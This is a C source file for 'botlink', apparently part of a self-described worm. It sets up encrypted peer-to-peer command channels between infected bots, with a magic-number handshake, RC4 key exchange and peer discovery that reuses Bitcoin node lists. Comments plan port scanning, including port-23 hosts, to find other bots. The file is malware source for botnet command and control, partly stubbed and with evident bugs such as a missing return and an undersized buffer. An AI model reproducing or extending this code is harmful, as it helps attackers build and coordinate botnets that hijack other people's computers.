/*

bot link..

bots communicating directly, or via third party protocols

Nodes structure was already established for bitcoin..
we also want other protocols to be able to feed messages here

if it cannot connect for X time.. it could use desperate() to port scan for bot port,
also it can start checking every port 23 found for bot port since half the search is over

ip generate seed can be used to ensure different bots scan different IPs
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include "structs.h"
#include "list.h"
#include "utils.h"
#include "botlink.h"
#include "portscan.h"
#include <rc4.h>
// for reusing bitcon's node connection function
#include "modules/bitcoin/note_bitcoin.h"

#define BOT_PORT 4843
#define BOT_MAGIC 0xDABCADAA
#define BOT_PKT 0xAABBCCDD
#define MIN_BOT_CONNECTIONS 15

// various states of bot communication
enum {
    BOT_HANDSHAKE_IN=TCP_CONNECTED,
    BOT_HANDSHAKE_OUT=APP_HANDSHAKE,
    BOT_KEY_EXCHANGE=4096,
    BOT_PERFECT=STATE_OK
};


typedef struct _bot_header {
    uint32_t magic;
    uint16_t len;
    //uint32_t checksum;
} BotMSGHdr;


// verify the packet is correct and has the entire packet..
int BotMSGVerify(char *buf, int size) {
    BotMSGHdr *_hdr = (BotMSGHdr *)buf;
    
    // ensure it has enough of the packet
    if (size < sizeof(BotMSGHdr)) return 0;
    // check if the magic is correct
    if (_hdr->magic != BOT_PKT) return -1;
    
    // add checksum here..
    
    // now verify we have the entire packet..
    if (size < (sizeof(BotMSGHdr) + _hdr->len)) {
        return 0;
    }
}


typedef struct _bot_variables {
    // in case we wanna save bot information for next connection
    struct _bot_variables *next;
    
    int state;
    
    // encryption key
    char *key_in;
    char *key_out;
    int key_size_in;
    int key_size_out;
    rc4_key rc4_iv_in;
    rc4_key rc4_iv_out;
    
    // when we change keys.. this should be flagged
    // so after the CHOP we process all incoming data
    // with the new encryption key
    int crypt_sync;
    
    // bot ID & size
    char *bot_id;
    int bot_id_size;
} BotVariables;


BotVariables *BotVars(Connection *cptr) {
    if (cptr->buf == NULL) {
        cptr->buf = (char *)malloc(sizeof(BotVariables) + 1);
        
        if (cptr->buf == NULL)
            return NULL;
        
        memset(cptr->buf, 0, sizeof(BotVariables));
    }
    
    return (BotVariables *)cptr->buf;
}



// for port scanning.. we only care about nodes (starting new connections)
// and the main loop
ModuleFuncs botlink_funcs = {
    &botlink_read,
    &botlink_write,
    &botlink_incoming,
    NULL, //&botlink_outgoing,
    &botlink_main_loop,
    &botlink_connect,
    NULL //&botlink_disconnect,
};

Modules HACK_botlink = {
    // required ( NULL, NULL, 0 )
    NULL, NULL, 0,
    // port, state
    BOT_PORT, 0,
    // required 0, 0..  
    0, 0,
    // timer = 5 seconds .. timeout is 15 so it should be fine for catching bad connections
    // we will run this every 5 seconds since we are a WORM
    5,
    // bitcoin functions
    &botlink_funcs, NULL,
    // no magic bytes for portscan
    NULL, 0
};


// botlink desperate
// if we desperately need to attempt to connect to nodes.. we can port scan
int botlink_desperate() {
    //Portscan_Add(&HACK_botlink, BOT_PORT);
    //Portscan_Enable(BOT_PORT, 1);
}

// initialize the module
int botlink_init(Modules **_module_list) {
    Module_Add(_module_list, &HACK_botlink);
}

int botlink_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
    // handle tcp/ip for each connection
    // will flush outgoing queue, and fill incoming
    
    // handle timers (ping/pong)
    // logic for enough nodes
    int connection_count = L_count((LIST *)mptr->connections);
    if (connection_count < MIN_BOT_CONNECTIONS) {
        // attempt to connect to however many nodes we are mising under X connections
        // reuse bitcoin connect nodes..
        bitcoin_connect_nodes(mptr, MIN_BOT_CONNECTIONS - connection_count);
    } 
}

// will handle encryption for talking to other bots
int botlink_write(Modules *mptr, Connection *cptr, char **buf, int *size) {
    BotVariables *vars = BotVars(cptr);
    //if (!vars || vars->key_size == 0) return *size;
    
    if (!stateOK(cptr)) return *size;
    // perform encryption
    rc4((unsigned char *)*buf, *size, &vars->rc4_iv_out);
    
    return *size;
}

// will handle decryption for communication with other bots
int botlink_read(Modules *mptr, Connection *cptr, char **buf, int *size) {
    BotVariables *vars = BotVars(cptr);
    //if (!vars || vars->key_size == 0) return *size;

    if (!stateOK(cptr)) return *size;
    
    // perform decryption
    rc4((unsigned char *)*buf, *size, &vars->rc4_iv_in);
    
    return *size;
}


// parsing incoming bot messages
int botlink_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
    int i = 0;
    int ret = -1;
    BotVariables *vars = BotVars(cptr);
    struct _botlink_parsers {
        int state;
        module_func function;    
    } BotlinkParsers[] = {
        { BOT_HANDSHAKE_OUT, &botlink_handshake },
        { BOT_HANDSHAKE_IN, &botlink_handshake },
        { BOT_KEY_EXCHANGE, &botlink_keyexchange },
        { BOT_PERFECT, &botlink_message },
        { 0, NULL }
    };
    BotMSGHdr *_hdr = (BotMSGHdr *)buf;
    Queue *qptr = NULL;
    
    // ensure we have bot variables.. if not we wanna kill it
    if (vars == NULL) return ret;
    
    // verify whether or not the messages passes.. or not enough data, etc..
    i = BotMSGVerify(buf, size);
    
    // if it doesnt, or needs more data.. return that value
    if (i <= 0) return i;

    
    // ret = -1.. so if the function/state isnt found
    // itll break the connection.. and the function needs to return 1 to remove msgs
    for (i = 0; BotlinkParsers[i].function != NULL; i++) {
        if (BotlinkParsers[i].state == vars->state) {
            ret = BotlinkParsers[i].function(mptr, cptr, buf + sizeof(BotMSGHdr), size - sizeof(BotMSGHdr));
            break;
        }
    }
    
    // lets chop this buffer down by removing this command.. in case
    // a subsequent command was merged
    QueueChopBuf(cptr, buf, sizeof(BotMSGHdr) + _hdr->len);

    // now if we toggled cryptography.. lets apply it to all current incoming packets
    // its possible our module is slower than the remote side sending messages
    if (vars->crypt_sync) {
        vars->crypt_sync = 0;
                
        qptr = cptr->incoming;
        while (qptr != NULL) {
            
            rc4((unsigned char *)qptr->buf, qptr->size, &vars->rc4_iv_in);
            
            qptr = qptr->next;
        }
    }
    
    // we dont need the message anymore..
    return ret;
}

// all bot msgs use BotMSGHdr.. so this is called last before QueueAdd()
int bot_pushpkt(Modules *mptr, Connection *cptr, char *pkt, int pktsize) {
    char *buf = NULL;
    int size = 0;
    BotMSGHdr *hdr = NULL;
    int ret = -1;
    
    size = sizeof(BotMSGHdr) + pktsize;
    if ((buf = (char *)malloc(pktsize + 1)) == NULL) {
        return -1;
    }
    
    hdr = (BotMSGHdr *)buf;
    hdr->magic = BOT_PKT;
    hdr->len = pktsize;
    //hdr->checksum = 0;
    
    memcpy(buf + sizeof(BotMSGHdr), pkt, pktsize);
    
    ret = QueueAdd(mptr, cptr, NULL, buf, size);
    
    memset(buf, 0, size);
    
    free(buf);
    
    return ret;
}


int bot_pushmagic(Modules *mptr, Connection *cptr) {
    char vbuf[16];
    char *sptr = (char *)&vbuf;

    put_int32(&sptr, BOT_MAGIC);
    
    return bot_pushpkt(mptr, cptr,(char *) &vbuf, sizeof(int32_t));
}

int bot_checkmagic(char *buf, int size) {
    int32_t magic = 0;
    
    // we are expecting the bot magic here..
    // we return 0 so that the message doesnt get removed..
    // we will wait for it to be at least the space required..
    if (size < sizeof(int32_t)) return 0;
    
    char *sptr = (char *)buf;
    magic = get_int32(&sptr);
    
    // ensure the bot magic is correct (like a handshake)
    if (magic != BOT_MAGIC) return -1;

    return 1;    
}

int bot_sendkey(Modules *mptr, Connection *cptr) {
    BotVariables *vars = BotVars(cptr);
    char *key = NULL;
    int key_size = 0;
    int i = 0;
    char *keybuf = NULL;
    int key_pkt_size = 0;
    char *sptr = NULL;
    
    // first generate a key
    key_size = 16 + rand()%32;
    key = (char *)malloc(key_size + 1);
    if (key == NULL) {
        ConnectionBad(cptr);
        return -1;
    }
    
    for (i = 0; i < key_size; i++)
        key[i] = rand()%255;
    
    // set it up in outgoing key structure..
    vars->key_out = key;
    vars->key_size_out = key_size;
    
    // prepare rc4 iv (change to rc6, etc later)
    prepare_key((unsigned char *)vars->key_out, vars->key_size_out, &vars->rc4_iv_out);
    
    // build packet to give key to other side
    key_pkt_size = sizeof(int32_t) + key_size;
    
    if ((keybuf = (char *)malloc(key_pkt_size + 1)) == NULL)
        return -1;
        
    // build final packet..
    sptr = (char *)keybuf;
    put_int32(&sptr, key_size);
    memcpy(sptr, key, key_size);
    
    // queue it..
    i = bot_pushpkt(mptr, cptr, keybuf, key_pkt_size);
    //i = QueueAdd(mptr, cptr, NULL, keybuf, key_pkt_size);
    
    // free temp key pkt from memory here..
    memset(keybuf, 0, key_pkt_size);
    free(keybuf);
    // return queueadd response
    return i;
}

// whenever we connect to another bot
// needs to initiate handshake, etc
int botlink_connect(Modules *mptr, Connection *cptr, char *buf, int size) {
    BotVariables *vars = BotVars(cptr);
    
    if (vars == NULL) {
        ConnectionBad(cptr);
        return 1;
    }

    bot_pushmagic(mptr, cptr); 
    
    cptr->state = BOT_HANDSHAKE_OUT;   
    
    // we want it to continue and process the outgoing queue after.. so return 0
    return 0;
}


int botlink_handshake(Modules *mptr, Connection *cptr, char *buf, int size) {
    BotVariables *vars = BotVars(cptr);
    int32_t magic = 0;
    
    // we are expecting the bot magic here..
    // we return 0 so that the message doesnt get removed..
    // we will wait for it to be at least the space required..
    if (size < sizeof(int32_t)) return 0;
    
    char *sptr = (char *)buf;
    magic = get_int32(&sptr);
    
    // ensure the bot magic is correct (like a handshake)
    if (magic != BOT_MAGIC) return -1;
    
    if (cptr->state != BOT_HANDSHAKE_OUT)
        bot_pushmagic(mptr, cptr);
    
    // if that was fine.. now we want to send over an encryption key
    // and we expect an encryption key from the other side..
    cptr->state = BOT_KEY_EXCHANGE;
    
    if (bot_sendkey(mptr, cptr) == -1) return -1;
    
    return 1;
}

int botlink_keyexchange(Modules *mptr, Connection *cptr, char *buf, int size) {
    BotVariables *vars = BotVars(cptr);
    int key_size = 0;
    char *ptr = (char *)buf;
    // ensure it has the size of the key   
    if (size < sizeof(int32_t)) return 0;
    // get the size of the key
    key_size = get_int32(&ptr);
    // ensure it has the entire key in the queue fragment    
    if (size < (sizeof(int32_t) + key_size)) return 0;
    // allocate space for the key
    if ((vars->key_in = (char *)malloc(key_size + 1)) == NULL) {
        // if that failed.. return 0.. maybe something fixes itself for next round
        return 0;
    }
    
    // copy key & state size in connection instructions
    memcpy(vars->key_in, ptr, key_size);    
    vars->key_size_in = key_size;
    // use rc4 function to initialize the key & key structure    
    prepare_key((unsigned char *)vars->key_in, vars->key_size_in, &vars->rc4_iv_in);
    
    // let the incoming func know we toggled encryption so a desync doesnt happen
    vars->crypt_sync = 1;
    
    // set state to perform a normal connection
    cptr->state = BOT_PERFECT;
    
    return 1;
}


char *bot_push_cmd(unsigned char cmd, char *fmt, ...) {
    
}

enum {
    BOT_CMD_PING,
    BOT_CMD_PONG,
    BOT_CMD_HIGH
};

int bot_cmd_ping(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}


int botlink_message(Modules *mptr, Connection *cptr, char *buf, int size) {
    int ret = 1;
    int i = 0;
    BotVariables *vars = BotVars(cptr);
    CMDHdr *hdr = (CMDHdr *)buf;
    struct _bot_commands {
        unsigned char cmd;
        module_func function;
        unsigned short size;
    } BotCommands[] = {
        { BOT_CMD_PING, &bot_cmd_ping, 0 },
        { BOT_CMD_PONG, NULL, 0 },
        { 0, NULL }
    };
    
    
    // if we do not have the full packet yet..
    if (size < sizeof(CMDHdr))
        return 0;
    
    for (; BotCommands[i].function != NULL; i++) {
        if (BotCommands[i].cmd == hdr->cmd) {
            // we have to make sure the entire packet for this command exists
            if (size < (hdr->size + BotCommands[i].size))
                return 0;
                
            BotCommands[i].function(mptr, cptr, buf, size);
            
        }
    }
    
    return 1;
}


// -- functions not in use..
/*

// whether we need to filter outgoing messages..
// disabled for now.. we wont be filtering our own messages
// for this module
int botlink_outgoing(Modules *mptr, Connection *cptr, char **buf, int *size) {
    
}

// disconnect is disabled for now.. since its irrelevant..
// maybe later we can save the clients structure in a holding place for a bit
int botlink_disconnect(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}
*/